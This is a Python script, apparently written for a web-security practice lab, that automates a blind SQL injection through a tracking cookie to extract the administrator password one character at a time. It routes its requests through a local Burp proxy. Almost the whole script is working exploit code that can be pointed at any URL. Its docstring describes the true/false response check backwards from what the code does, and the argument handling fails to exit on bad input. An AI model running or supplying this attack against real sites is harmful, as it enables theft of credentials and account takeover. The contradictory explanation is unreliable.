#Python script that performs a blind SQL injection attack to extract the administrator's password from a vulnerable website.
import sys
import requests
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'https': 'https://127.0.0.1:8080','http':'http://127.0.0.1:8080'}
def sqli_password(url):
    '''
    It initializes an empty string variable password_extracted to store the extracted password.
The outer loop runs 20 times (from 1 to 20), indicating the length of the password.
The inner loop iterates over ASCII values from 32 to 126, representing printable characters, which will be used as the injected character in the SQL payload.
Inside the inner loop, an SQL payload is constructed using the current iteration values (i and j). The payload injects a condition into the SQL query to extract a specific character of the administrator's password.
The SQL payload is URL-encoded using urllib.parse.quote to ensure proper transmission in the URL.
Cookies are constructed with a TrackingId and session values. These values need to be obtained from a tool like Burp Suite, which captures the request and allows modification for the SQL injection attack.
The requests.get method is called with the target URL, cookies, verify=False (to ignore SSL/TLS certificate verification), and the proxies dictionary for routing requests through the proxy.
If the response does not contain the string "Welcome," it means the injected SQL condition was successful, and the current character is appended to password_extracted and displayed on the console.
If the response contains "Welcome," it means the injected SQL condition failed, indicating that the current character is incorrect. In this case, the loop breaks and moves on to the next character
    '''
    password_extracted = ""
    with requests.Session() as session:
        for i in range(1,21):
            for j in range(32,126):# using the hash keys
                sqli_payload = " ' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--"%(i,j)
                sqli_payload_encoded = urllib.parse.quote(sqli_payload)
                cookies = {'TrackingId':'HDVNw4suQzu2277y'+sqli_payload_encoded,'session':'GxTzQ45Wc7Y9EWaWSngiX84gz63M0z7l'}#place the TrackingId and session from the burpsuite
                r = requests.get(url, cookies=cookies,proxies=proxies,verify=False)#
                if "Welcome" not in r.text:
                    sys.stdout.write('\r' + password_extracted + chr(j))
                    sys.stdout.flush()
                else:
                    password_extracted += chr(j)
                    sys.stdout.write('\r' + password_extracted)
                    sys.stdout.flush()
                    break
def main():
    '''
    The main function is defined to handle command-line arguments and initiate the password retrieval process.
It checks if the number of command-line arguments is not equal to 2 (the script name and the target URL). If it's not, it displays usage instructions and exits.
The URL is retrieved from sys.argv[1].
The sqli_password function is called with the provided URL.
    '''
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Retrieving administator password...")
    sqli_password(url)
if __name__ == "__main__":
    main()